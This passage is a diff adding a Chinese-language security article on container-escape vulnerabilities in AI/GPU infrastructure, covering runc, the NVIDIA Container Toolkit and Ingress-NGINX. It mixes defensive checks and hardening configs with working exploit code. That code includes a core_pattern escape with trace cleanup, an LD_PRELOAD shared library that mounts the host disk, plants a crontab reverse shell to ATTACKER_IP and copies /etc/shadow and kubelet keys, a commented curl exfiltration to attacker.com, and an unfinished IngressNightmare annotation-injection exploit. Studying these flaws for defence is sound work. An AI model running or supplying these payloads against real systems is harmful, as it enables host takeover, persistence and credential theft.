+    <span class="k">def</span><span class="w"> </span><span class="nf">check_vulnerable</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bool</span><span class="p">:</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;检查 runc 版本是否受影响&quot;&quot;&quot;</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span>
+            <span class="p">[</span><span class="s2">&quot;runc&quot;</span><span class="p">,</span> <span class="s2">&quot;--version&quot;</span><span class="p">],</span>
+            <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="kc">True</span>
+        <span class="p">)</span>
+        <span class="n">version_line</span> <span class="o">=</span> <span class="n">result</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="c1"># 受影响版本: runc &lt; 1.2.8, &lt; 1.3.3</span>
+        <span class="c1"># 简化判断逻辑</span>
+        <span class="k">if</span> <span class="s2">&quot;1.2.&quot;</span> <span class="ow">in</span> <span class="n">version_line</span> <span class="ow">or</span> <span class="s2">&quot;1.3.&quot;</span> <span class="ow">in</span> <span class="n">version_line</span><span class="p">:</span>
+            <span class="n">parts</span> <span class="o">=</span> <span class="n">version_line</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
+            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">parts</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">2</span><span class="p">:</span>
+                <span class="n">version</span> <span class="o">=</span> <span class="n">parts</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>  <span class="c1"># &quot;1.2.7&quot;</span>
+                <span class="n">major</span><span class="p">,</span> <span class="n">minor</span><span class="p">,</span> <span class="n">patch</span> <span class="o">=</span> <span class="nb">map</span><span class="p">(</span><span class="nb">int</span><span class="p">,</span> <span class="n">version</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">))</span>
+                <span class="k">if</span> <span class="p">(</span><span class="n">major</span><span class="p">,</span> <span class="n">minor</span><span class="p">,</span> <span class="n">patch</span><span class="p">)</span> <span class="o">&lt;</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">8</span><span class="p">):</span>
+                    <span class="k">return</span> <span class="kc">True</span>
+                <span class="k">if</span> <span class="p">(</span><span class="n">major</span><span class="p">,</span> <span class="n">minor</span><span class="p">)</span> <span class="o">==</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span> <span class="ow">and</span> <span class="n">patch</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">:</span>
+                    <span class="k">return</span> <span class="kc">True</span>
+        <span class="k">return</span> <span class="kc">False</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">prepare_exploit</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;准备逃逸 payload&quot;&quot;&quot;</span>
+        <span class="n">payload_script</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;#!/bin/bash</span>
+<span class="s2"># payload.sh — 在宿主机以 root 执行</span>
+<span class="s2"># 通过 core_pattern 触发</span>
+<span class="s2">TARGET_PID=$1</span>
+<span class="s2">BINARY=$2</span>
+
+<span class="s2"># 反弹 shell 到攻击者控制的服务器</span>
+<span class="s2">bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1</span>
+
+<span class="s2"># 或者直接操作宿主机文件系统</span>
+<span class="s2"># echo &quot;attacker ALL=(ALL) NOPASSWD:ALL&quot; &gt;&gt; /etc/sudoers</span>
+<span class="s2"># cat /etc/shadow &gt; /tmp/shadow_exfil</span>
+<span class="s2"># curl http://attacker.com/exfil -d @/etc/shadow</span>
+<span class="s2">&quot;&quot;&quot;</span>
+        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;/tmp/payload.sh&quot;</span><span class="p">,</span> <span class="s2">&quot;w&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload_script</span><span class="p">)</span>
+        <span class="n">os</span><span class="o">.</span><span class="n">chmod</span><span class="p">(</span><span class="s2">&quot;/tmp/payload.sh&quot;</span><span class="p">,</span> <span class="mo">0o755</span><span class="p">)</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">trigger_escape</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;触发逃逸&quot;&quot;&quot;</span>
+        <span class="c1"># 步骤 1: 通过符号链接替换 /dev/null</span>
+        <span class="c1"># (已在 Dockerfile 中完成)</span>
+
+        <span class="c1"># 步骤 2: 写入恶意 core_pattern</span>
+        <span class="c1"># core_pattern 格式: |路径 参数</span>
+        <span class="c1"># %p = 崩溃进程 PID, %E = 可执行文件路径</span>
+        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">host_core_pattern</span><span class="p">,</span> <span class="s2">&quot;w&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&quot;|/tmp/payload.sh %p </span><span class="si">%E</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+
+        <span class="c1"># 步骤 3: 触发段错误，内核执行 core_pattern 中的命令</span>
+        <span class="c1"># 此时 payload.sh 以 root (uid 0) 在宿主机命名空间执行</span>
+        <span class="n">os</span><span class="o">.</span><span class="n">kill</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">getpid</span><span class="p">(),</span> <span class="n">signal</span><span class="o">.</span><span class="n">SIGSEGV</span><span class="p">)</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">cleanup</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;清理痕迹&quot;&quot;&quot;</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">host_core_pattern</span><span class="p">,</span> <span class="s2">&quot;w&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+                <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&quot;core</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>  <span class="c1"># 恢复默认值</span>
+            <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="s2">&quot;/tmp/payload.sh&quot;</span><span class="p">)</span>
+        <span class="k">except</span><span class="p">:</span>
+            <span class="k">pass</span>
+
+
+<span class="c1"># === 防御: runc 版本检测 ===</span>
+<span class="k">class</span><span class="w"> </span><span class="nc">RuncSecurityCheck</span><span class="p">:</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;runc 安全检查工具&quot;&quot;&quot;</span>
+
+    <span class="nd">@staticmethod</span>
+    <span class="k">def</span><span class="w"> </span><span class="nf">check_version</span><span class="p">():</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;检查 runc 版本是否已修复&quot;&quot;&quot;</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span>
+            <span class="p">[</span><span class="s2">&quot;runc&quot;</span><span class="p">,</span> <span class="s2">&quot;--version&quot;</span><span class="p">],</span>
+            <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="kc">True</span>
+        <span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;runc version: </span><span class="si">{</span><span class="n">result</span><span class="o">.</span><span class="n">stdout</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+        <span class="c1"># 修复版本矩阵</span>
+        <span class="n">fixed_versions</span> <span class="o">=</span> <span class="p">{</span>
+            <span class="s2">&quot;1.2&quot;</span><span class="p">:</span> <span class="s2">&quot;1.2.8&quot;</span><span class="p">,</span>
+            <span class="s2">&quot;1.3&quot;</span><span class="p">:</span> <span class="s2">&quot;1.3.3&quot;</span><span class="p">,</span>
+            <span class="s2">&quot;1.4&quot;</span><span class="p">:</span> <span class="s2">&quot;1.4.0-rc.3&quot;</span>
+        <span class="p">}</span>
+
+        <span class="k">for</span> <span class="n">branch</span><span class="p">,</span> <span class="n">fixed</span> <span class="ow">in</span> <span class="n">fixed_versions</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
+            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;  Branch </span><span class="si">{</span><span class="n">branch</span><span class="si">}</span><span class="s2">: fixed in </span><span class="si">{</span><span class="n">fixed</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+    <span class="nd">@staticmethod</span>
+    <span class="k">def</span><span class="w"> </span><span class="nf">check_dangerous_mounts</span><span class="p">():</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;检查 Dockerfile 中的危险挂载&quot;&quot;&quot;</span>
+        <span class="n">dangerous_patterns</span> <span class="o">=</span> <span class="p">[</span>
+            <span class="s2">&quot;RUN --mount=type=bind,source=/dev/null&quot;</span><span class="p">,</span>
+            <span class="s2">&quot;RUN --mount=type=bind,source=/proc&quot;</span><span class="p">,</span>
+            <span class="s2">&quot;RUN --mount=type=bind,source=/sys&quot;</span><span class="p">,</span>
+        <span class="p">]</span>
+
+        <span class="c1"># 扫描项目中的所有 Dockerfile</span>
+        <span class="kn">import</span><span class="w"> </span><span class="nn">glob</span>
+        <span class="k">for</span> <span class="n">dockerfile</span> <span class="ow">in</span> <span class="n">glob</span><span class="o">.</span><span class="n">glob</span><span class="p">(</span><span class="s2">&quot;**/Dockerfile*&quot;</span><span class="p">,</span> <span class="n">recursive</span><span class="o">=</span><span class="kc">True</span><span class="p">):</span>
+            <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">dockerfile</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+                <span class="n">content</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+                <span class="k">for</span> <span class="n">pattern</span> <span class="ow">in</span> <span class="n">dangerous_patterns</span><span class="p">:</span>
+                    <span class="k">if</span> <span class="n">pattern</span> <span class="ow">in</span> <span class="n">content</span><span class="p">:</span>
+                        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[!] </span><span class="si">{</span><span class="n">dockerfile</span><span class="si">}</span><span class="s2">: dangerous mount pattern found&quot;</span><span class="p">)</span>
+                        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;    Pattern: </span><span class="si">{</span><span class="n">pattern</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+</code></pre></div>
+
+<h3>2.4 CVE-2025-52881：LSM 绕过</h3>
+<div class="highlight"><pre><span></span><code><span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">CVE-2025-52881: 绕过 LSM (Linux Security Module) 检查</span>
+<span class="sd">使 /proc/self/attr/&lt;label&gt; 引用真实 procfs 文件</span>
+<span class="sd">&quot;&quot;&quot;</span>
+
+<span class="c1"># 攻击原理:</span>
+<span class="c1"># 1. runc 在设置容器 SELinux/AppArmor 标签时写入 /proc/self/attr/exec</span>
+<span class="c1"># 2. 攻击者通过符号链接将 /proc/self/attr/exec 指向:</span>
+<span class="c1">#    - /proc/sysrq-trigger → 主机崩溃 (DoS)</span>
+<span class="c1">#    - /proc/sys/kernel/core_pattern → 完整逃逸</span>
+<span class="c1"># 3. runc 的 LSM 检查认为写入的是 attr 文件，不做额外验证</span>
+
+<span class="c1"># 防御: Pod Security Admission</span>
+<span class="n">psa_restricted_policy</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;</span>
+<span class="s2">apiVersion: v1</span>
+<span class="s2">kind: Namespace</span>
+<span class="s2">metadata:</span>
+<span class="s2">  name: ai-workloads</span>
+<span class="s2">  labels:</span>
+<span class="s2">    pod-security.kubernetes.io/enforce: restricted</span>
+<span class="s2">    pod-security.kubernetes.io/audit: restricted</span>
+<span class="s2">    pod-security.kubernetes.io/warn: restricted</span>
+<span class="s2">---</span>
+<span class="s2"># Restricted PSA 禁止:</span>
+<span class="s2"># - privileged: true</span>
+<span class="s2"># - hostPath volumes</span>
+<span class="s2"># - hostPID, hostIPC, hostNetwork</span>
+<span class="s2"># - root 用户 (runAsNonRoot: true)</span>
+<span class="s2"># - 不安全的 procfs 挂载</span>
+<span class="s2">apiVersion: v1</span>
+<span class="s2">kind: Pod</span>
+<span class="s2">metadata:</span>
+<span class="s2">  name: ai-inference-safe</span>
+<span class="s2">  namespace: ai-workloads</span>
+<span class="s2">spec:</span>
+<span class="s2">  securityContext:</span>
+<span class="s2">    runAsNonRoot: true</span>
+<span class="s2">    runAsUser: 1000</span>
+<span class="s2">    fsGroup: 2000</span>
+<span class="s2">    seccompProfile:</span>
+<span class="s2">      type: RuntimeDefault</span>
+<span class="s2">  containers:</span>
+<span class="s2">  - name: inference</span>
+<span class="s2">    image: ai-model:v1.2.3@sha256:abc123...  # 使用 digest 而非 latest</span>
+<span class="s2">    securityContext:</span>
+<span class="s2">      allowPrivilegeEscalation: false</span>
+<span class="s2">      readOnlyRootFilesystem: true</span>
+<span class="s2">      capabilities:</span>
+<span class="s2">        drop: [&quot;ALL&quot;]</span>
+<span class="s2">    resources:</span>
+<span class="s2">      limits:</span>
+<span class="s2">        memory: &quot;16Gi&quot;</span>
+<span class="s2">        cpu: &quot;4&quot;</span>
+<span class="s2">        nvidia.com/gpu: 1</span>
+<span class="s2">    volumeMounts:</span>
+<span class="s2">    - name: tmp</span>
+<span class="s2">      mountPath: /tmp</span>
+<span class="s2">    - name: model-cache</span>
+<span class="s2">      mountPath: /models</span>
+<span class="s2">      readOnly: true</span>
+<span class="s2">  volumes:</span>
+<span class="s2">  - name: tmp</span>
+<span class="s2">    emptyDir: </span><span class="si">{}</span>
+<span class="s2">  - name: model-cache</span>
+<span class="s2">    persistentVolumeClaim:</span>
+<span class="s2">      claimName: model-pvc-readonly</span>
+<span class="s2">&quot;&quot;&quot;</span>
+</code></pre></div>
+
+<hr />
+<h2>3. NVIDIA Container Toolkit 逃逸（NVIDIAScape）</h2>
+<h3>3.1 漏洞概述</h3>
+<table>
+<thead>
+<tr>
+<th>CVE</th>
+<th>CVSS</th>
+<th>影响版本</th>
+<th>影响</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CVE-2025-23266</td>
+<td>高危</td>
+<td>Toolkit &lt; v1.17.8, GPU Operator &lt; v25.3.1</td>
+<td>37% 云 GPU 环境受影响</td>
+</tr>
+<tr>
+<td>CVE-2024-0132</td>
+<td>9.0</td>
+<td>2024年9月披露</td>
+<td>TOCTOU 竞态条件</td>
+</tr>
+</tbody>
+</table>
+<h3>3.2 CVE-2025-23266 PoC</h3>
+<div class="highlight"><pre><span></span><code><span class="c"># CVE-2025-23266 PoC — 仅用于授权测试</span>
+<span class="c"># 利用 OCI hooks 在主机以 root 运行的特性</span>
+
+<span class="k">FROM</span><span class="w"> </span><span class="s">nvidia/cuda:12.0-base</span>
+
+<span class="c"># 恶意共享库 — 将在容器启动时被主机 root 进程加载</span>
+<span class="k">COPY</span><span class="w"> </span>poc.so<span class="w"> </span>/tmp/poc.so
+
+<span class="c"># LD_PRELOAD 注入: toolkit 的 hook 进程（主机 root）会加载此库</span>
+<span class="k">ENV</span><span class="w"> </span><span class="nv">LD_PRELOAD</span><span class="o">=</span>/tmp/poc.so
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code><span class="c1">// poc.c — 恶意共享库源码</span>
+<span class="c1">// 编译: gcc -shared -fPIC -o poc.so poc.c -ldl</span>
+
+<span class="cp">#define _GNU_SOURCE</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;dlfcn.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/types.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/wait.h&gt;</span>
+
+<span class="c1">// constructor 属性: 库被加载时自动执行</span>
+<span class="n">__attribute__</span><span class="p">((</span><span class="n">constructor</span><span class="p">))</span>
+<span class="kt">void</span><span class="w"> </span><span class="n">on_load</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="c1">// 此时运行在 NVIDIA Container Toolkit 的 hook 进程中</span>
+<span class="w">    </span><span class="c1">// 该进程以主机 root 身份运行</span>
+
+<span class="w">    </span><span class="kt">pid_t</span><span class="w"> </span><span class="n">pid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fork</span><span class="p">();</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">pid</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="c1">// 子进程: 执行逃逸 payload</span>
+
+<span class="w">        </span><span class="c1">// 1. 挂载宿主机根文件系统</span>
+<span class="w">        </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;mkdir -p /tmp/host_root&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;mount /dev/sda1 /tmp/host_root 2&gt;/dev/null || &quot;</span>
+<span class="w">               </span><span class="s">&quot;mount /dev/nvme0n1p1 /tmp/host_root 2&gt;/dev/null || &quot;</span>
+<span class="w">               </span><span class="s">&quot;mount /dev/vda1 /tmp/host_root 2&gt;/dev/null&quot;</span><span class="p">);</span>
+
+<span class="w">        </span><span class="c1">// 2. 写入持久化后门</span>
+<span class="w">        </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;echo &#39;* * * * * root /bin/bash -c &quot;</span>
+<span class="w">               </span><span class="s">&quot;</span><span class="se">\&quot;</span><span class="s">bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1</span><span class="se">\&quot;</span><span class="s">&#39; &quot;</span>
+<span class="w">               </span><span class="s">&quot;&gt;&gt; /tmp/host_root/etc/crontab&quot;</span><span class="p">);</span>
+
+<span class="w">        </span><span class="c1">// 3. 窃取宿主机凭证</span>
+<span class="w">        </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;cat /tmp/host_root/etc/shadow &gt; /tmp/shadow_exfil&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;cat /tmp/host_root/var/lib/kubelet/pki/kubelet.key &quot;</span>
+<span class="w">               </span><span class="s">&quot;&gt; /tmp/kubelet_key_exfil 2&gt;/dev/null&quot;</span><span class="p">);</span>
+
+<span class="w">        </span><span class="c1">// 4. 窃取 AI 模型权重</span>
+<span class="w">        </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;find /tmp/host_root -name &#39;*.safetensors&#39; -o -name &#39;*.bin&#39; &quot;</span>
+<span class="w">               </span><span class="s">&quot;-o -name &#39;pytorch_model*&#39; | head -10 &gt; /tmp/model_paths&quot;</span><span class="p">);</span>
+
+<span class="w">        </span><span class="n">_exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="c1">// 父进程: 继续正常执行，不引起怀疑</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<h3>3.3 防御方案</h3>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/bin/bash</span>
+<span class="c1"># NVIDIA Container Toolkit 安全加固脚本</span>
+
+<span class="c1"># 1. 检查并升级版本</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;[*] Checking NVIDIA Container Toolkit version...&quot;</span>
+nvidia-ctk<span class="w"> </span>--version
+<span class="c1"># 修复版本: &gt;= 1.17.8</span>
+<span class="c1"># 升级: apt-get update &amp;&amp; apt-get install nvidia-container-toolkit=1.17.8-1</span>
+
+<span class="c1"># 2. 禁用 LD_PRELOAD (如果可能)</span>
+<span class="c1"># 在 NVIDIA Container Toolkit 配置中</span>
+cat<span class="w"> </span>&gt;<span class="w"> </span>/etc/nvidia-container-runtime/config.toml<span class="w"> </span><span class="s">&lt;&lt; &#39;EOF&#39;</span>
+<span class="s">[nvidia-container-cli]</span>
+<span class="s"># 禁止通过 LD_PRELOAD 注入</span>
+<span class="s">loading =</span>
+<span class="s">disable-require = false</span>
+<span class="s"># 仅允许特定挂载</span>
+<span class="s">no-cgroups = false</span>
+<span class="s"># 验证所有 hook</span>
+<span class="s">verify-hooks = true</span>
+<span class="s">EOF</span>
+
+<span class="c1"># 3. 使用 Pod Security Admission 限制</span>
+kubectl<span class="w"> </span>label<span class="w"> </span>namespace<span class="w"> </span>gpu-workloads<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>pod-security.kubernetes.io/enforce<span class="o">=</span>restricted
+
+<span class="c1"># 4. 使用 seccomp profile 限制系统调用</span>
+cat<span class="w"> </span>&gt;<span class="w"> </span>/tmp/nvidia-seccomp.json<span class="w"> </span><span class="s">&lt;&lt; &#39;SECCOMP&#39;</span>
+<span class="s">{</span>
+<span class="s">  &quot;defaultAction&quot;: &quot;SCMP_ACT_ERRNO&quot;,</span>
+<span class="s">  &quot;architectures&quot;: [&quot;SCMP_ARCH_X86_64&quot;],</span>
+<span class="s">  &quot;syscalls&quot;: [</span>
+<span class="s">    {</span>
+<span class="s">      &quot;names&quot;: [</span>
+<span class="s">        &quot;read&quot;, &quot;write&quot;, &quot;open&quot;, &quot;openat&quot;, &quot;close&quot;, &quot;mmap&quot;,</span>
+<span class="s">        &quot;mprotect&quot;, &quot;munmap&quot;, &quot;brk&quot;, &quot;rt_sigaction&quot;, &quot;rt_sigprocmask&quot;,</span>
+<span class="s">        &quot;ioctl&quot;, &quot;pread64&quot;, &quot;pwrite64&quot;, &quot;readv&quot;, &quot;writev&quot;,</span>
+<span class="s">        &quot;access&quot;, &quot;pipe&quot;, &quot;select&quot;, &quot;sched_yield&quot;, &quot;mremap&quot;,</span>
+<span class="s">        &quot;msync&quot;, &quot;mincore&quot;, &quot;madvise&quot;, &quot;shmget&quot;, &quot;shmat&quot;, &quot;shmctl&quot;,</span>
+<span class="s">        &quot;dup&quot;, &quot;dup2&quot;, &quot;pause&quot;, &quot;nanosleep&quot;, &quot;getitimer&quot;, &quot;alarm&quot;,</span>
+<span class="s">        &quot;setitimer&quot;, &quot;getpid&quot;, &quot;sendfile&quot;, &quot;socket&quot;, &quot;connect&quot;,</span>
+<span class="s">        &quot;accept&quot;, &quot;sendto&quot;, &quot;recvfrom&quot;, &quot;sendmsg&quot;, &quot;recvmsg&quot;,</span>
+<span class="s">        &quot;shutdown&quot;, &quot;bind&quot;, &quot;listen&quot;, &quot;getsockname&quot;, &quot;getpeername&quot;,</span>
+<span class="s">        &quot;socketpair&quot;, &quot;setsockopt&quot;, &quot;getsockopt&quot;, &quot;clone&quot;, &quot;fork&quot;,</span>
+<span class="s">        &quot;vfork&quot;, &quot;execve&quot;, &quot;exit&quot;, &quot;wait4&quot;, &quot;kill&quot;, &quot;uname&quot;,</span>
+<span class="s">        &quot;fcntl&quot;, &quot;flock&quot;, &quot;fsync&quot;, &quot;fdatasync&quot;, &quot;truncate&quot;, &quot;ftruncate&quot;,</span>
+<span class="s">        &quot;getdents&quot;, &quot;getcwd&quot;, &quot;chdir&quot;, &quot;fchdir&quot;, &quot;rename&quot;, &quot;mkdir&quot;,</span>
+<span class="s">        &quot;rmdir&quot;, &quot;creat&quot;, &quot;link&quot;, &quot;unlink&quot;, &quot;symlink&quot;, &quot;readlink&quot;,</span>
+<span class="s">        &quot;chmod&quot;, &quot;fchmod&quot;, &quot;chown&quot;, &quot;fchown&quot;, &quot;lchown&quot;, &quot;umask&quot;,</span>
+<span class="s">        &quot;gettimeofday&quot;, &quot;getrlimit&quot;, &quot;getrusage&quot;, &quot;sysinfo&quot;</span>
+<span class="s">      ],</span>
+<span class="s">      &quot;action&quot;: &quot;SCMP_ACT_ALLOW&quot;</span>
+<span class="s">    }</span>
+<span class="s">  ]</span>
+<span class="s">}</span>
+<span class="s">SECCOMP</span>
+</code></pre></div>
+
+<hr />
+<h2>4. Kubernetes 编排漏洞攻击链</h2>
+<h3>4.1 高危 K8s CVE 汇总</h3>
+<table>
+<thead>
+<tr>
+<th>CVE</th>
+<th>组件</th>
+<th>CVSS</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CVE-2025-1974</td>
+<td>Ingress-NGINX</td>
+<td>9.8</td>
+<td>IngressNightmare，未认证 RCE，影响 43% 云环境</td>
+</tr>
+<tr>
+<td>CVE-2024-21626</td>
+<td>runc</td>
+<td>8.6</td>
+<td>Leaky Vessels，影响 80% 云环境，勒索团伙在野利用</td>
+</tr>
+<tr>
+<td>CVE-2025-1176</td>
+<td>etcd</td>
+<td>9.5</td>
+<td>默认未启用 TLS 认证，暴露 2379 端口直接访问集群数据</td>
+</tr>
+</tbody>
+</table>
+<h3>4.2 IngressNightmare（CVE-2025-1974）攻击链</h3>
+<div class="highlight"><pre><span></span><code><span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">CVE-2025-1974: Ingress-NGINX AdmissionReview 注入</span>
+<span class="sd">攻击者构造恶意 AdmissionReview 请求，在 ingress-nginx controller 中执行任意代码</span>
+<span class="sd">&quot;&quot;&quot;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">json</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">kubernetes</span><span class="w"> </span><span class="kn">import</span> <span class="n">client</span><span class="p">,</span> <span class="n">config</span>
+
+<span class="k">class</span><span class="w"> </span><span class="nc">IngressNightmareExploit</span><span class="p">:</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;IngressNightmare 漏洞利用仿真器&quot;&quot;&quot;</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">webhook_url</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">        webhook_url: ingress-nginx validating webhook 的 URL</span>
+<span class="sd">        通常为: https://&lt;ingress-nginx-controller&gt;:8443/extensions/ingress</span>
+<span class="sd">        &quot;&quot;&quot;</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">webhook_url</span> <span class="o">=</span> <span class="n">webhook_url</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">craft_malicious_admission_review</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">payload_cmd</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">dict</span><span class="p">:</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;构造恶意 AdmissionReview 请求&quot;&quot;&quot;</span>
+
+        <span class="c1"># 将 payload 嵌入到 Ingress 资源的 annotation 中</span>
+        <span class="c1"># ingress-nginx controller 会解析这些 annotation 并执行 nginx 配置渲染</span>
+        <span class="c1"># 通过配置注入实现 RCE</span>
+
+        <span class="n">malicious_ingress</span> <span class="o">=</span> <span class="p">{</span>
+            <span class="s2">&quot;apiVersion&quot;</span><span class="p">:</span> <span class="s2">&quot;networking.k8s.io/v1&quot;</span><span class="p">,</span>
+            <span class="s2">&quot;kind&quot;</span><span class="p">:</span> <span class="s2">&quot;Ingress&quot;</span><span class="p">,</span>
+            <span class="s2">&quot;metadata&quot;</span><span class="p">:</span> <span class="p">{</span>
+                <span class="s2">&quot;name&quot;</span><span class="p">:</span> <span class="s2">&quot;legitimate-ingress&quot;</span><span class="p">,</span>
+                <span class="s2">&quot;namespace&quot;</span><span class="p">:</span> <span class="s2">&quot;default&quot;</span><span class="p">,</span>
+                <span class="s2">&quot;annotations&quot;</span><span class="p">:</span> <span class="p">{</span>
+                    <span class="c1"># 通过 nginx 配置注入执行命令</span>
+                    <span class="s2">&quot;nginx.ingress.kubernetes.io/configuration-snippet&quot;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&quot;&quot;&quot;</span>
+<span class="s2">                        # 注入的恶意配置</span>
+<span class="s2">                        lua_need_request_body off;</span>
+<span class="s2">                        access_by_lua_block </span><span class="se">{{</span>
+<span class="s2">                            os.execute(&quot;</span><span class="si">{</span><span class="n">payload_cmd</span><span class="si">}</span><span class="s2">&quot;)</span>
+<span class="s2">                        </span><span class="se">}}</span>
+<span class="s2">                    &quot;&quot;&quot;</span><span class="p">,</span>
+                    <span class="c1"># 或者通过 server-snippet 注入</span>
